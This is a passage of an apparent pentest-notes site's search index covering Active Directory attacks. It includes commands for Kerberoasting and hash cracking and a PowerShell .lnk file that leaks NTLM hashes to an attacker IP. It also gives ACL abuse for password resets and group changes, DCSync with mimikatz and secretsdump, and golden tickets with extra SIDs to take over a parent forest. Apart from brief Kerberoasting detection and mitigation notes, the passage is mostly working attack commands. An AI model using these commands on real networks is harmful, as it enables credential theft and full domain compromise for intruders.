\"MSSQLSvc/DEV-PRE-SQL.domain.local:1433\"\n</code></pre> <pre><code>mimikatz # base64 /out:true\nmimikatz # kerberos::list \n</code></pre> <pre><code>echo \"&lt;base64 blob&gt;\" |  tr -d \\\\n\n</code></pre> <pre><code>cat encoded_file | base64 -d &gt; sqldev.kirbi\n</code></pre> <pre><code>python2.7 kirbi2john.py sqldev.kirbi\n</code></pre> <p>This will create a file called <code>crack_file</code>. We then must modify the file a bit to be able to use Hashcat against the hash.</p> <pre><code>sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; sqldev_tgs_hashcat\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#cracking-a-ticket","title":"Cracking a ticket","text":"Encryption Type (etype) Name / Algorithm Hashcat Mode Notes / Where Seen <code>23</code> RC4-HMAC (arcfour-hmac-md5) 13100 Default for older AD, common in Kerberoasting. Weak, fastest to crack. <code>17</code> AES128-CTS-HMAC-SHA1-96 19600 Seen when RC4 is disabled; newer/modern service accounts. <code>18</code> AES256-CTS-HMAC-SHA1-96 19700 Stronger; common when \"AES only\" enforced. <code>3</code> DES-CBC-MD5 Obsolete (no current Hashcat mode) Legacy, should be disabled. <code>RC4-HMAC-OLD</code> / <code>etype 24</code> RC4-HMAC with old salt usage (rare) Use 13100 Rare edge cases, still cracks with RC4 mode.","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li>None</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#detection","title":"Detection","text":"<ul> <li> <p>Event ID 4769: A Kerberos service ticket was requested</p> </li> <li> <p>Requests where the Ticket Encryption Type is 0x17 (RC4). In a modern environment, this should be rare</p> </li> <li> <p>Requests for service tickets from unusual workstations or for accounts that rarely see this activity.</p> </li> <li> <p>LDAP queries that search for accounts with an SPN like <code>(servicePrincipalName=*)</code></p> </li> <li> <p>Create a honey account and make a custom alert for tickets requested for that account</p> </li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#mitigation","title":"Mitigation","text":"<ul> <li> <p>Strong Passwords: This is the most effective mitigation. Enforce a strong password policy for service accounts</p> </li> <li> <p>Use Group Managed Service Accounts: gMSAs are the gold standard. Their passwords are 240 characters long, complex, and automatically managed and rotated by Active Directory</p> </li> <li> <p>Protected Users Group: Add high-value accounts (including service accounts where possible) to the \"Protected Users\" security group. This enforces stronger security controls, such as disabling NTLM and preventing the use of weaker Kerberos encryption types.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/NTLM%20Hash%20Theft/","title":"NTLM Hash Theft","text":"","tags":["AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/NTLM%20Hash%20Theft/#theft-files","title":"Theft Files","text":"<p>Any writable directory (shares, nfs, locally) where users will list contents you can use certain file types to steal hashes</p> <p>Manual: (.lnk)</p> <pre><code>$objShell = New-Object -ComObject WScript.Shell\n$lnk = $objShell.CreateShortcut(\"\\\\DC01.domain.local\\OpenShare\\IT-Driver.lnk\")\n$lnk.TargetPath = \"\\\\&lt;AttackerIP&gt;\\@ico.png\"\n$lnk.WindowStyle = 1\n$lnk.IconLocation = \"%windir%\\system32\\shell32.dll, 3\"\n$lnk.Description = \"IT Driver\"\n$lnk.HotKey = \"Ctrl+Alt+O\"\n$lnk.Save()\n</code></pre> <p>Automated (multi-type):</p> <p>https://github.com/Greenwolf/ntlm_theft</p> <p>Generate all file types:</p> <pre><code>python3 ntlm_theft.py -g all -s &lt;attackerIP&gt; -f '@myfile'\n</code></pre> <p>Monitor for traffic with Responder on linux or Inveigh on windows.  Hash received? Try to crack it <pre><code>hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt\n</code></pre></p> <p>OR:  Relay Attacks</p>","tags":["AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/NTLM%20Hash%20Theft/#poisoning","title":"Poisoning","text":"<ul> <li>LLMNR Poisoning</li> <li>IPv6 Attacks</li> </ul>","tags":["AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/NTLM%20Hash%20Theft/#relaying","title":"Relaying","text":"<ul> <li>Relay Attacks</li> </ul>","tags":["AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/NTLM%20Hash%20Theft/#misc-locations","title":"Misc Locations","text":"<ul> <li>https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/</li> </ul>","tags":["AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Unconstrained%20Delegation/","title":"Unconstrained Delegation","text":"","tags":["Authenticated","Elevated","Kerberos","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Unconstrained%20Delegation/#identify","title":"Identify","text":"<p>Linux - remote <pre><code>nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation\n</code></pre> Windows - local <pre><code>ADSearch.exe --search \"(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" --attributes samaccountname,dnshostname\n</code></pre></p> <p>Domain Controllers are always permitted for unconstrained delegation.</p>","tags":["Authenticated","Elevated","Kerberos","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Unconstrained%20Delegation/#exploit","title":"Exploit","text":"","tags":["Authenticated","Elevated","Kerberos","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Unconstrained%20Delegation/#force-dc-to-auth-to-our-box-and-steal-tgt","title":"Force DC to auth to our box and steal TGT","text":"<p>Monitor for tickets with Rubeus <pre><code>Rubeus.exe monitor /interval:10 /nowrap\n</code></pre></p> <p>see: Authentication Coercion</p> <p>OR: Run https://github.com/cube0x0/SharpSystemTriggers to coerce authentication <pre><code>SharpSpoolTrigger.exe dc01.lab.local web.dev.lav.local\n</code></pre> Where: - DC01 is the \"target\". - WEB is the \"listener\".</p> <p>Rebeus should capture a ticket</p>","tags":["Authenticated","Elevated","Kerberos","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Domain%20ACLs/","title":"Domain ACLs","text":"<p>List of abusable ACEs</p> <ul> <li><code>ForceChangePassword</code> abused with <code>Set-DomainUserPassword</code></li> <li><code>Add Members</code> abused with <code>Add-DomainGroupMember</code></li> <li><code>GenericAll</code> abused with <code>Set-DomainUserPassword</code> or <code>Add-DomainGroupMember</code></li> <li><code>GenericWrite</code> abused with <code>Set-DomainObject</code></li> <li><code>WriteOwner</code> abused with <code>Set-DomainObjectOwner</code></li> <li><code>WriteDACL</code> abused with <code>Add-DomainObjectACL</code></li> <li><code>AllExtendedRights</code> abused with <code>Set-DomainUserPassword</code> or <code>Add-DomainGroupMember</code></li> <li><code>Addself</code> abused with <code>Add-DomainGroupMember</code></li> </ul>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Domain%20ACLs/#identify","title":"Identify","text":"<p>Windows (powerview) <pre><code>Find-InterestingDomainAcl\n</code></pre> <pre><code>Import-Module .\\PowerView.ps1\n$sid = Convert-NameToSid wley\n</code></pre> <pre><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} \n</code></pre> Check what objects have ACLs over a specific user <pre><code>Get-DomainObjectAcl -Identity harry.jones -Domain inlanefreight.local -ResolveGUIDs\n</code></pre></p> <p>ACLs are granted to USER1 over USER2 <pre><code>(Get-ACL \"AD:$((Get-ADUser &lt;USER2&gt;).distinguishedname)\").access  | ? {$_.IdentityReference -eq \"DOMAIN.LOCAL\\USER1\"}\n</code></pre> FInd all users with a specific ACL over USER1 (GenericAll in this example) <pre><code>(Get-ACL \"AD:$((Get-ADUser &lt;USER1&gt;).distinguishedname)\").access  | ? {$_.ActiveDirectoryRights -match \"WriteProperty\" -or $_.ActiveDirectoryRights -match \"GenericAll\"} | Select IdentityReference,ActiveDirectoryRights -Unique | ft -W\n</code></pre></p> <p>Note</p> <p>that if PowerView has already been imported, the cmdlet shown below will result in an error. Therefore, we may need to run it from a new PowerShell session. Or just look at bloodhound</p> <p>Manually <pre><code>Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt\n</code></pre> <pre><code>foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\htb-student\\Desktop\\ad_users.txt\")) {get-acl  \"AD:\\$(Get-ADUser $line)\" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}}\n</code></pre> from here we would google the \u201cObjectType\u201d entry to find the rights the GUID represents</p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Domain%20ACLs/#exploit","title":"Exploit","text":"","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Domain%20ACLs/#force-change-password","title":"Force-Change-Password","text":"<p><pre><code>$SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword) \n</code></pre> <pre><code>$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n</code></pre> <pre><code>Import-Module .\\Powerview.ps1\n</code></pre> <pre><code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Domain%20ACLs/#add-domaingroupmember","title":"Add-DomainGroupMember","text":"<p><pre><code>$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\damundsen', $SecPassword) \n</code></pre> <pre><code>Import-Module .\\Powerview.ps1\n</code></pre> <pre><code>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose\n</code></pre> <pre><code>Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Domain%20ACLs/#genericall","title":"GenericAll","text":"<p>Targeted kerberoast <pre><code>Import-Module .\\Powerview.ps1\n</code></pre> <pre><code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose\n</code></pre> <pre><code>.\\Rubeus.exe kerberoast /user:adunn /nowrap\n</code></pre> Add user to domain admins <pre><code>Net group \"domain admins\" &lt;user&gt; /add /domain\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Domain%20ACLs/#ds-replication-get-changes-all","title":"DS-Replication-Get-Changes-All","text":"<p>From linux <pre><code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5\n</code></pre> From windows <pre><code>runas /netonly /user:INLANEFREIGHT\\adunn powershell\n</code></pre> <pre><code>.\\mimikatz.exe\nprivilege::debug\nlsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Domain%20ACLs/#remove-spn","title":"Remove SPN","text":"<p>Removing the Fake SPN from adunn's Account <pre><code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose\n</code></pre> Removing damundsen from the Help Desk Level 1 Group <pre><code>Remove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'damundsen' -Credential $Cred2 -Verbose\n</code></pre> Confirming damundsen was Removed from the Group <pre><code>Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Domain%20ACLs/#genericwrite-on-user","title":"GenericWrite on User","text":"","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Domain%20ACLs/#targeted-kerberoasting","title":"Targeted Kerberoasting","text":"<p>Set SPN (if you're running a process as the user with GenericWrite) <pre><code>setspn -a domain.local/user.domain.local:1337 domain.local\\user\n</code></pre></p> <p>If your're running as different user</p> <p>Import-Module .\\Powerview.ps1 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('object.local\\smith', $SecPassword)</p> <p>Set-DomainObject -Credential $Cred -Identity maria -SET @{serviceprincipalname='foobar/xd'}</p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Domain%20ACLs/#change-users-logon-scripts","title":"Change users logon scripts","text":"<p>Global writeable location <pre><code>cd C:\\programdata\\\necho 'whoami &gt; C:\\programdata\\out.txt' &gt; test.ps1\n\nSet-DomainObject -Identity &lt;targetuser&gt; -SET @{scriptpath='C:\\programdata\\test.ps1'}\n</code></pre> check if it worked <pre><code>net user &lt;target user&gt;\n</code></pre></p>","tags":["Add-Members","Addself","AllExtendedRights","DS-Replication-Get-Changes","ForceChangePassword","GenericAll","GenericWrite","Lateral-Movement","Persistence","Privilege-Escalation","Self-Membership","WriteDACL","WriteOwner","WriteProperty","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/","title":"Forest & Domain Trusts","text":"","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#overview","title":"Overview","text":"<p>A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides.</p> <ul> <li><code>Parent-child</code>: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain <code>corp.inlanefreight.local</code> could authenticate into the parent domain <code>inlanefreight.local</code>, and vice-versa.</li> <li><code>Cross-link</code>: A trust between child domains to speed up authentication.</li> <li><code>External</code>: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering or filters out authentication requests (by SID) not from the trusted domain.</li> <li> <p><code>Tree-root</code>: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.  </p> </li> <li> <p><code>Forest</code>: A transitive trust between two forest root domains.</p> </li> <li>ESAE: A bastion forest used to manage Active Directory. Trusts can be transitive or non-transitive.</li> <li>A <code>transitive</code> trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if <code>Domain A</code> has a trust with <code>Domain B</code>, and <code>Domain B</code> has a <code>transitive</code> trust with <code>Domain C</code>, then <code>Domain A</code> will automatically trust <code>Domain C</code>.</li> <li>In a <code>non-transitive trust</code>, the child domain itself is the only one trusted.</li> </ul> Transitive Non-Transitive Shared, 1 to many Direct trust The trust is shared with anyone in the forest Not extended to next level child domains Forest, tree-root, parent-child, and cross-link trusts are transitive Typical for external or custom trust setups <p>one-way or two-way (bidirectional). - <code>One-way trust</code>: Users in a <code>trusted</code> domain can access resources in a trusting domain, not vice-versa. - <code>Bidirectional trust</code>: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between <code>INLANEFREIGHT.LOCAL</code> and <code>FREIGHTLOGISTICS.LOCAL</code>, users in <code>INLANEFREIGHT.LOCAL</code> would be able to access resources in <code>FREIGHTLOGISTICS.LOCAL</code>, and vice-versa.</p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#identify","title":"Identify","text":"<p>Remote <pre><code>nxc ldap &lt;ip&gt; -u user -p pass -M enum_trusts\n</code></pre> Local <pre><code>Import-Module activedirectory\nGet-ADTrust -Filter *\n</code></pre> <pre><code>netdom query /domain:inlanefreight.local trust\n</code></pre> Find DC <pre><code>netdom query /domain:inlanefreight.local dc\n</code></pre> Find other machines <pre><code>netdom query /domain:inlanefreight.local workstation\n</code></pre></p> <p>Enum users in child domain <pre><code>Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#child-parent-trusts-from-windows","title":"Child -&gt; Parent Trusts from Windows","text":"","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#sidhistory-attribute","title":"sidHistory attribute","text":"<p>If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain. - If child domain has been compromised, this will allow you to move into parent domain - if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest.</p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#attack-requirements","title":"Attack Requirements","text":"<ul> <li>The KRBTGT hash for the child domain</li> <li>The SID for the child domain</li> <li>The name of a target user in the child domain (does not need to exist!)</li> <li>The FQDN of the child domain.</li> <li>The SID of the Enterprise Admins group of the root domain.</li> <li>With this data collected, the attack can be performed with Mimikatz. Obtain KRBTGT for child domain <pre><code>mimikatz # lsadump::dcsync /user:CHILD\\krbtgt\n</code></pre> Get SID for child domain <pre><code>Get-DomainSID\n</code></pre> Get SID of Enterprise Admins group of root domain <pre><code>Get-DomainGroup -Domain DOMAIN.LOCAL -Identity \"Enterprise Admins\" | select distinguishedname,objectsid\n# or with ad module\n Get-ADGroup -Identity \"Enterprise Admins\" -Server \"DOMAIN.LOCAL\"\n</code></pre> FQDN of the child <pre><code>Get-ADDomain\n</code></pre> Create Golden Ticket with Mimikatz <pre><code>mimikatz # kerberos::golden /user:hacker /domain:CHILD.DOMAIN.LOCAL /sid:&lt;SID-OF-CHILD-DOMAIN&gt; /krbtgt:&lt;KRBTGTHASH&gt; /sids:&lt;SID-of-Enterperise-Admins-gropup-of-root-domain&gt; /ptt\n</code></pre> Create Golden Ticket with Rubeus <pre><code>.\\Rubeus.exe golden /rc4:&lt;KRBTGT-HASH&gt; /domain:CHILD.DOMAIN.LOCAL /sid:&lt;SID-OF-CHILD-DOMAIN&gt;  /sids:&lt;SID-of-Enterperise-Admins-gropup-of-root-domain&gt; /user:hacker /ptt\n</code></pre> DCSync <pre><code>mimikatz # lsadump::dcsync /user:DOMAIN\\lab_adm\n</code></pre> If our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller <pre><code>mimikatz # lsadump::dcsync /user:DOMAIN\\lab_adm /domain:DOMAIN.LOCAL\n</code></pre></li> </ul>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#child-parent-trusts-from-linux","title":"Child -&gt; Parent Trusts from Linux","text":"<p><pre><code>impacket-secretsdump child.domain.local/&lt;owned_user&gt;@&lt;DCIP&gt; -just-dc-user CHILD/krbtgt\n</code></pre> <pre><code>lookupsid.py child.domain.local/&lt;owned_user&gt;@&lt;dcip&gt; | grep \"Domain SID\"\n</code></pre> <pre><code>lookupsid.py child.domain.local/&lt;owned_user&gt;@&lt;target-dc-ip&gt; | grep -B12 \"Enterprise Admins\"\n</code></pre> request ticket <pre><code>impacket-ticketer -nthash &lt;krbtgthash&gt; -domain CHILD.DOMAIN.LOCAL -domain-sid &lt;CHILD DOMAIN SID&gt; -extra-sid &lt;enterprise-admins-sid&gt; hacker\n</code></pre> <pre><code>export KRB5CCNAME=hacker.ccache \n</code></pre> <pre><code>impacket-psexec CHILD.DOMAIN.LOCAL/hacker@dc01.domain.local -k -no-pass -target-ip &lt;dc-ip&gt;\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#automated-attack","title":"Automated attack","text":"<pre><code>raiseChild.py -target-exec &lt;target-dc&gt; child.domain.local/lab_adm\n</code></pre>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#cross-forest-trust-abuse-from-windows","title":"Cross-Forest Trust Abuse - from Windows","text":"<p>Cross-Forest Kerberoasting depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold <pre><code>Get-DomainUser -SPN -Domain DOMAIN2.LOCAL | select SamAccountName\n</code></pre> <pre><code>Get-DomainUser -Domain DOMAIN2.LOCAL -Identity sqlsvc |select samaccountname,memberof\n</code></pre> <pre><code>.\\Rubeus.exe kerberoast /domain:DOMAIN2.LOCAL /user:sqlsvc /nowrap\n</code></pre> Admin Password Re-Use &amp; Group Membership <pre><code>Get-DomainForeignGroupMember -Domain DOMAIN2.LOCAL\n</code></pre> <pre><code>Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500\n</code></pre> <pre><code>Enter-PSSession -ComputerName DC03.DOMAIN2.LOCAL -Credential DOMAIN\\administrator\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Forest%20%26%20Domain%20Trusts/#attacking-domain-trusts-cross-forest-trust-abuse-from-linux","title":"Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux","text":"<p>Cross-Forest Kerberoasting</p> <p>note</p> <p>To do this, we need credentials for a user that can authenticate into the other domain and specify the <code>-target-domain</code> flag in our command</p> <pre><code>impacket-GetUserSPNs -request -target-domain DOMAIN2.LOCAL DOMAIN.LOCAL/user\n</code></pre> <p>it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned</p> <p>Hunting Foreign Group Membership with Bloodhound-python add to resolv.conf so we can resolv DNS entries for first domain <pre><code>cat /etc/resolv.conf \n# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)\n#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN\n# 127.0.0.53 is the systemd-resolved stub resolver.\n# run \"resolvectl status\" to see details about the actual nameservers.\n\\#nameserver 1.1.1.1\n\\#nameserver 8.8.8.8\ndomain DOMAIN.LOCAL\nnameserver 172.16.5.5\n</code></pre> Run bloodhound <pre><code>bloodhound-python -d DOMAIN.LOCAL -dc DC01 -c All -u &lt;user&gt; -p &lt;pass&gt;\n</code></pre> add resolv.conf entries for second forest <pre><code>cat /etc/resolv.conf \n# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)\n#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN\n# 127.0.0.53 is the systemd-resolved stub resolver.\n# run \"resolvectl status\" to see details about the actual nameservers.\n\\#nameserver 1.1.1.1\n\\#nameserver 8.8.8.8\ndomain DOMAIN2.LOCAL\nnameserver 172.16.5.238\n</code></pre> Run bloodhound <pre><code>bloodhound-python -d DOMAIN2.LOCAL -dc DC02.DOMNAIN2.LOCAL -c All -u user@DOMAIN.local -p 'pass'\n</code></pre> upload to bloodhound, click on <code>Users with Foreign Domain Group Membership</code> under the <code>Analysis</code> tab and select the source domain as <code>DOMAIN.LOCAL</code>.</p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Group%20Policy%20Abuse/","title":"Group Policy Abuse","text":"","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Group%20Policy%20Abuse/#identify","title":"Identify","text":"<p><pre><code>Get-GPO -All | Select DisplayName\n</code></pre> Check if group has control <pre><code>$sid=Convert-NameToSid \"Domain Users\"\nGet-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}\n</code></pre> Converting GPO GUID to Name <pre><code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532\n</code></pre> group3r https://github.com/Group3r/Group3r <pre><code>group3r.exe -f &lt;filepath-name.log&gt; \n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Group%20Policy%20Abuse/#in-bloodhound","title":"In BloodHound","text":"<p>Checking in BloodHound, we can see that the <code>Domain Users</code> group has several rights over the <code>Disconnect Idle RDP</code> GPO, which could be leveraged for full control of the object.</p> <p>If we select the GPO in BloodHound and scroll down to <code>Affected Objects</code> on the <code>Node Info</code> tab, we can see that this GPO is applied to one OU, which contains four computer objects.</p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Group%20Policy%20Abuse/#exploit","title":"Exploit","text":"<p>https://github.com/FSecureLABS/SharpGPOAbuse We could use a tool such as SharpGPOAbuse to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar.</p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Kerberos%20Double%20Hop/","title":"Kerberos Double Hop","text":"","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Kerberos%20Double%20Hop/#explainer","title":"Explainer","text":"<p>If you\u2019re accessing a resource with network authentication, like winrm, your creds may not be cached in memory. Because of this, actions you take that you have permissions to take may be denied. The DC cannot recognize your access rights.</p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Kerberos%20Double%20Hop/#workarounds","title":"Workarounds","text":"","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Kerberos%20Double%20Hop/#1-use-invoke-command-to-pass-a-pscredential-object-with-every-request","title":"1. Use Invoke-Command to pass a PSCredential object with every request","text":"<p><pre><code>$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\\user', $SecPassword)\n</code></pre> <pre><code>Import-Module powerview.ps1\nget-domainuser -spn -credential $Cred | select samaccountname\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Kerberos%20Double%20Hop/#2-register-pssession-configuration-from-windows","title":"2. Register PSSession Configuration (from windows)","text":"<p><pre><code>Register-PSSessionConfiguration -Name &lt;namethesessionyhere&gt; -RunAsCredential domain\\user\n</code></pre> <pre><code>Restart-Service WinRM\n</code></pre> <pre><code>Enter-PSSession -ComputerName computer01 -Credential domain\\user -ConfigurationName 